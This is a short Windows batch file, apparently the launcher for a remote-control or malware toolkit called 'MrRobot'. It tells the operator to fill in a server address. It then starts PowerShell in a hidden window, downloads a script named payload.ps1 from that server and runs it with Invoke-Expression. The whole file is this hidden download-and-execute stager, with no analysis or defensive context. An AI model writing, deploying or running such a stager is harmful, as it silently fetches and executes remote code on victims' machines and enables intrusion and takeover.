@echo off
REM Put here the web address of your server without the last '/' and with 'http://' at the start
set SERVER_WEB_ADDR=http://127.0.0.1/MrRobot
powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('%SERVER_WEB_ADDR%/payload.ps1'); x %SERVER_WEB_ADDR%
